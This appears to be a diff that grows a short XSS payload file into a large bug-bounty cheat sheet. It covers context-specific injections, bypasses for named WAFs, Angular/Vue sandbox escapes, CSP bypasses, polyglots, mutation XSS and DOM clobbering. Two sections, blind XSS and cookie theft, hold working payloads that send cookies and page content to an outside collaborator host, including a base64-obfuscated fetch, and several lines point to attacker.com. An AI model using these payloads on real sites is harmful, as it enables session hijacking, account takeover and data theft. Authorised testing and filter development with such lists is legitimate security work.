@@ -1,54 +1,392 @@
-# XSS Payloads
-# Categories: Basic, Event Handler, Polyglot, DOM, Blind, React-specific
+# XSS Payloads — Advanced Bug Bounty Edition
+# Sources: PortSwigger XSS Cheat Sheet, PayloadsAllTheThings, ERO-HACK/bypassXSS,
+#          Advanced-XSS, OffSecKit, Payload Playground, real H1/BC writeups (2025-2026)
+# Categories: Context, WAF Bypass, Framework, CSP, Blind, mXSS, Encoding, Polyglot
 
-# === Basic Script ===
+# ============================================================
+# SECTION 1: CONTEXT-SPECIFIC PAYLOADS
+# ============================================================
+
+# --- HTML Body Context ---
 <script>alert(1)</script>
-<script>prompt(1)</script>
-<script>confirm(1)</script>
-
-# === HTML Event Handlers ===
 <img src=x onerror=alert(1)>
-<img src=x onerror=prompt(1)>
-<img src=x onerror=confirm(1)>
-<svg/onload=alert(1)>
-<body onload=alert(1)>
+<svg onload=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<details open ontoggle=alert(1)><summary>X</summary></details>
 <input autofocus onfocus=alert(1)>
-<details open ontoggle=alert(1)>
-<select autofocus onfocus=alert(1)>
-<textarea autofocus onfocus=alert(1)>
-<video onloadstart=alert(1) src=x>
+<body onload=alert(1)>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+<video><source src=x onerror=alert(1)>
 <marquee onstart=alert(1)>
+<audio src=x onerror=alert(1)>
+<isindex type=image src=x onerror=alert(1)>
+<object data=x onerror=alert(1)>
+<link rel=stylesheet href=x onerror=alert(1)>
+<keygen autofocus onfocus=alert(1)>  # Chrome-only
+<meter onmouseover=alert(1)>
 
-# === Attribute-Based ===
-" onmouseover=alert(1) x="
-" onfocus=alert(1) autofocus x="
-' onfocus=alert(1) autofocus x='
+# --- Double-Quoted Attribute Context ---
+"><script>alert(1)</script>
 "><img src=x onerror=alert(1)>
-"><svg/onload=alert(1)>
+" onfocus=alert(1) autofocus x="
+" onmouseover=alert(1) x="
+" autofocus onfocus=alert(1) x="
+" onfocus=alert(1) autofocus="
+
+# --- Single-Quoted Attribute Context ---
+'><script>alert(1)</script>
+' onfocus=alert(1) autofocus x='
+' onmouseover=alert(1) x='
+
+# --- Unquoted Attribute Context ---
+ x onclick=alert(1) x=
+ onclick=alert(1) autofocus
+ onmouseover=alert(1) foo=
+
+# --- JavaScript String Context (single quote) ---
+';alert(1)//
+';alert(1);//
+'-alert(1)-'
+';alert(1)//
+\';alert(1)//
+</script><script>alert(1)</script>
+
+# --- JavaScript String Context (double quote) ---
+";alert(1)//
+"-alert(1)-"
+</script><script>alert(1)</script>
+
+# --- JavaScript Template Literal Context ---
+${alert(1)}
+${7*7}
+`;alert(1)//
+${constructor.constructor('alert(1)')()}
+
+# --- URL / href Context ---
 javascript:alert(1)
+javascript:alert(document.domain)
+javascript:void(0) (safe test)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+vbscript:alert(1)  # IE only
 
-# === Polyglot ===
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)>\x3e
+# --- CSS / style Context ---
+</style><script>alert(1)</script>
+</style><img src=x onerror=alert(1)>
+expression(alert(1))  # IE only
+background:url(javascript:alert(1))  # IE only
 
-# === DOM-Based (no HTML injection needed) ===
-#constructor.constructor('alert(1)')()
-#{"a":1}['constructor']['constructor']('alert(1)')()
+# ============================================================
+# SECTION 2: WAF BYPASS TECHNIQUES
+# ============================================================
 
-# === React/Special Contexts ===
+# --- Case Mixing ---
+<ScRiPt>alert(1)</sCrIpT>
+<IMG SRC=x onerror=alert(1)>
+<SvG/onload=alert(1)>
+<dEtAiLs open OnToGgLe=alert(1)>
+
+# --- Tag Confusion ---
+< <script>alert(1)</script>
+<<script>alert(1)</script>
+<SCRIPT>alert(1)</SCRIPT>
+
+# --- Space/Newline/ Tab Obfuscation ---
+<IMG SRC=x onerror=alert(1)>
+<img src=x%09onerror=alert(1)>
+<img src=x%0Aonerror=alert(1)>
+<img src=x%0Donerror=alert(1)>
+<img src=x%0Donerror=alert(1)>
+<img src=x onerror=%09alert(1)>
+
+# --- Comment Injection in Events ---
+<img src=x onerror=alert/**/(1)>
+<svg onload=alert/**/(1)>
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+
+# --- Newer Events WAFs Often Miss ---
+<xss oncontentvisibilityautostatechange=alert(1) style="content-visibility:auto" popover>
+<input onbeforematch=alert(1) hidden=until-found>
+<details open ontoggle=alert(1)>
+<marquee loop=1 onfinish=alert(1)>
+<body onscroll=alert(1)><br><br>...<br><br>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+
+# --- Null Byte / Invalid Characters ---
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scri<script>pt>alert(1)</script>
+<sc<script>ript>alert(1)</sc</script>ript>
+
+# --- Double URL Encoding ---
+%253Cscript%253Ealert(1)%253C/script%253E
+%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
+
+# --- Unicode/Charcode Obfuscation ---
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+<a onmouseover=location='jav\x61script:alert(1)'>test</a>
+
+# --- Hex/Octal Encoding in src ---
+%00 (null byte injection)
+<iframe src=javasc&#x72;ipt:alert(1)>
+<iframe src=javasc&#114;ipt:alert(1)>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+
+# --- Template Literal Injection (WAF bypass) ---
+${alert(1)}
+`${alert(1)}
+${`${alert(1)}`}
+
+# --- Array/Function Dereferencing (Bypass keyword detection) ---
+<svg/onload=alert(1)>
+<svg/onload=(alert)(1)>
+<svg/onload=window['alert'](1)>
+<svg/onload=this['alert'](1)>
+<svg/onload=top['alert'](1)>
+<svg/onload=self['alert'](1)>
+<svg/onload=[1].findIndex(alert)>
+<svg/onload=setTimeout`alert(1)>
+<svg/onload=setTimeout`alert\u00281\u0029>
+
+# --- ID + Quote Confusion (Akamai/Imperva bypass) ---
+<details open id="'&quot;'" ontoggle=alert(1)>
+<details open id="''&quot;'" ontoggle=alert(1)>
+
+# --- Attribute Overloading (Cloudflare bypass) ---
+<Img/Src/OnError=(alert)(1)>
+<img/src=x/onerror=alert(1)>
+<iframe/src=x/onload=alert(1)>
+
+# --- AWS WAF Bypass — HTTP Parameter Pollution ---
+?id=1&id=2&id=<script>alert(1)</script>
+?id=1&id=<script>&id=alert(1)&id=</script>
+
+# --- Cloudflare JSON Endpoint Bypass ---
+<svg/onload=%26%2397;lert(1)>
+<svg/onload=&#x61;lert(1)>
+<svg/onload=\u0061lert(1)>
+
+# ============================================================
+# SECTION 3: FRAMEWORK-SPECIFIC PAYLOADS
+# ============================================================
+
+# --- React / JSX ---
+{constructor.constructor('alert(1)')()}
 {{constructor.constructor('alert(1)')()}}
 ${alert(1)}
 <%%=alert(1)%%>
+dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}
 
-# === Blind XSS (Triggers callback) ===
-<script src=https://burpcollaborator.net/xss.js></script><img src=x onerror=eval(atob('ZmV0Y2goImh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvP2M9ZG9jdW1lbnQuY29va2llIik='))>
+# --- Angular / AngularJS ---
+{{constructor.constructor('alert(1)')()}}
+{{a='constructor';b='constructor';a[b]('alert(1)')()}}
+{{_=constructor.constructor;_(alert(1))}}
+{{$on.constructor('alert(1)')()}}
+{{a=toString().constructor.prototype;a.charAt=a.trim;$on=a;}}
 
-# === No Script Tags (Bypass filters) ===
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<body onload=alert(1)>
+# --- Vue.js ---
+{{['a'].pop().constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+{{$emit.constructor('alert(1)')()}}
 
-# === UTF-7 (Older browsers) ===
-+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+# --- jQuery ---
+$('<img/src/onerror=alert(1)>')
+$('<img/src/onerror=alert(1)>').appendTo('body')
+$('#x').html('<img src=x onerror=alert(1)>')
 
-# === Mutation XSS (mXSS) ===
+# ============================================================
+# SECTION 4: CSP BYPASS PAYLOADS
+# ============================================================
+
+# --- Script-src 'self' bypass via JSONP ---
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+<script src="https://www.google.com/recaptcha/api.js?onload=alert(1)"></script>
+
+# --- Script-src 'unsafe-inline' (not actually a bypass) ---
+# Works if CSP has 'unsafe-inline'
+<script>alert(1)</script>
+
+# --- CSP Bypass via Angular 1.x sandbox escape ---
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
+<div ng-app ng-csp><div ng-click="$event.view.alert(1)">test</div></div>
+
+# --- CSP Bypass via file download / upload ---
+<link rel=stylesheet href=/path/to/user/uploaded/file>
+<script src=/uploads/evil.js></script>
+
+# --- CSP Bypass via <base> tag hijack ---
+<base href=https://attacker.com/>
+<script src=/js/app.js></script>  # loads from attacker.com/js/app.js
+
+# ============================================================
+# SECTION 5: POLYGLOT PAYLOADS
+# ============================================================
+
+# --- The Classic Polyglot (works across HTML/JS/URL contexts) ---
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)>\x3e
+
+# --- Short Polyglot (multiple contexts) ---
+" onclick=alert(1)//<svg onload=alert(1)>
+
+# --- Context-Agnostic Auto-Fire ---
+/*'/*!/*<img src=x onerror=alert(1)><!--
+
+# --- Multi-Context Breakout ---
+</title></style></textarea></script><svg/onload=alert(1)>
+
+# ============================================================
+# SECTION 6: BLIND XSS PAYLOADS
+# ============================================================
+
+# --- Blind XSS Detection (callback to Burp Collaborator / Interactsh) ---
+<script src=https://burpcollaborator.net/xss.js></script>
+<img src=x onerror=eval(atob('ZmV0Y2goImh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvP2M9ZG9jdW1lbnQuY29va2llIik='))>
+<script>fetch('https://burpcollaborator.net/?c='+document.cookie)</script>
+<script>new Image().src='https://burpcollaborator.net/?c='+document.cookie</script>
+<img src=x onerror="this.src='https://burpcollaborator.net/?c='+document.cookie">
+<link rel=stylesheet href=https://burpcollaborator.net/test>
+<form id=x action=https://burpcollaborator.net method=POST><input name=cookie value=test></form><script>document.getElementById('x').submit()</script>
+
+# --- Blind XSS with Cookie Exfiltration ---
+<script>var i=new Image;i.src='https://burpcollaborator.net/?c='+encodeURI(document.cookie)</script>
+<script>document.location='https://burpcollaborator.net/?c='+document.cookie</script>
+<script>fetch('https://burpcollaborator.net/',{method:'POST',body:document.cookie})</script>
+<img src=x onerror="new Image().src='https://burpcollaborator.net/?c='+btoa(document.cookie)">
+
+# --- Blind XSS with Page Content Exfiltration ---
+<script>fetch('https://burpcollaborator.net/?html='+btoa(document.body.innerHTML))</script>
+<script>fetch('https://burpcollaborator.net/?url='+btoa(window.location.href))</script>
+
+# ============================================================
+# SECTION 7: MUTATION XSS (mXSS)
+# ============================================================
+
+# --- noscript mXSS ---
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+# --- select mXSS ---
+<select><p></select><img src=x onerror=alert(1)>
+
+# --- style mXSS ---
+<style><p></style><img src=x onerror=alert(1)>
+
+# --- title mXSS ---
+<title><p></title><img src=x onerror=alert(1)>
+
+# --- textarea mXSS ---
+<textarea><p></textarea><img src=x onerror=alert(1)>
+
+# --- xmp mXSS ---
+<xmp><p></xmp><img src=x onerror=alert(1)>
+
+# --- noembed mXSS ---
+<noembed><p></noembed><img src=x onerror=alert(1)>
+
+# ============================================================
+# SECTION 8: DOM CLOBBERING
+# ============================================================
+
+# --- Clobber window.x to hijack logic ---
+<a id=default></a><a id=default name=href href=javascript:alert(1)>
+
+# --- Clobber document.cookie for secure cookies ---
+<img name=cookie src=x onerror=alert(1)>
+
+# --- Clobber via form element ---
+<form id=config><input name=apiUrl value=attacker.com></form>
+
+# --- Clobber document.getElementById ---
+<img id=test name=src src=x onerror=alert(1)>
+
+# ============================================================
+# SECTION 9: ENCODING / OBFUSCATION VARIATIONS
+# ============================================================
+
+# --- Base64 ---
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+# --- Hex Encoding ---
+<img src=x onerror=\x61\x6c\x65\x72\x74(1)>
+<a onmouseover=location='jav\x61script:alert(1)'>test</a>
+
+# --- Unicode Normalization Attack (Full-width characters) ---
+＜script＞alert(1)＜/script＞
+(img src=x onerror=alert(1))
+ｓｃｒｉｐｔ (full-width chars — NFKC normalized)
+
+# --- Mixed Unicode Forms ---
+\\u0061\\u006c\\u0065\\u0072\\u0074(1)
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+
+# --- Octal Escape ---
+<img src=x onerror=\141\154\145\162\164(1)>
+
+# --- Dynamic Function Evaluation ---
+<script>Function('alert(1)')()</script>
+<script>setTimeout('alert(1)')</script>
+<script>setInterval('alert(1)')</script>
+this.constructor.constructor('alert(1)')()
+[].constructor.constructor('alert(1)')()
+
+# ============================================================
+# SECTION 10: SPECIAL TECHNIQUES
+# ============================================================
+
+# --- Dangling Markup Injection (no JS needed) ---
+<!-- <img src="https://attacker.com/steal?data=
+<button type=submit formaction=https://attacker.com/login>Click</button>
+<!-- <a href=https://attacker.com/steal> -->
+
+# --- postMessage XSS ---
+# Victim listener:
+#   window.addEventListener('message', function(e) {
+#     document.getElementById('content').innerHTML = e.data;
+#   });
+# Attacker iframe:
+#   frame.contentWindow.postMessage('<img src=x onerror=alert(1)>', '*')
+
+# --- DOM-based via location.hash ---
+# <img src=x onerror=eval(location.hash.slice(1))> #payload
+
+# --- XSS via SVG ---
+<svg xmlns="http://www.w3.org/2000/svg">
+<script xlink:href=data:,alert(1)></script>
+</svg>
+
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)><rect width=100 height=100 /></a></svg>
+
+<svg><use href=x onerror=alert(1)></use></svg>
+
+# --- XSS via MathML ---
+<math><mtext><table><mglyph><svg><image src=x onerror=alert(1)></svg></table></math>
+
+# --- XSS via Embed/Object ---
+<embed code=x onerror=alert(1)>
+<object data=x onerror=alert(1)>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+# ============================================================
+# SECTION 11: COOKIE THEFT (require HttpOnly=false)
+# ============================================================
+<script>document.location='https://burpcollaborator.net/?c='+document.cookie</script>
+<img src=x onerror="this.src='https://burpcollaborator.net/?c='+document.cookie">
+<script>new Image().src='https://burpcollaborator.net/?c='+encodeURI(document.cookie)</script>
+<script>fetch('https://burpcollaborator.net/',{method:'POST',mode:'no-cors',body:document.cookie})</script>
+
+# ============================================================
+# SECTION 12: XSS CHEATSHEET — Common Sinks (for DOM XSS)
+# ============================================================
+# innerHTML:  element.innerHTML = '<img src=x onerror=alert(1)>'
+# outerHTML:  element.outerHTML = '<img src=x onerror=alert(1)>'
+# document.write:  document.write('<img src=x onerror=alert(1)>')
+# eval:  eval('alert(1)')
+# setTimeout:  setTimeout('alert(1)', 0)
+# setInterval:  setInterval('alert(1)', 0)
+# Function:  new Function('alert(1)')()
+# innerHTML via jQuery:  $('#x').html('<img src=x onerror=alert(1)>')
+# insertAdjacentHTML:  element.insertAdjacentHTML('beforeend', '<img src=x onerror=alert(1)>')
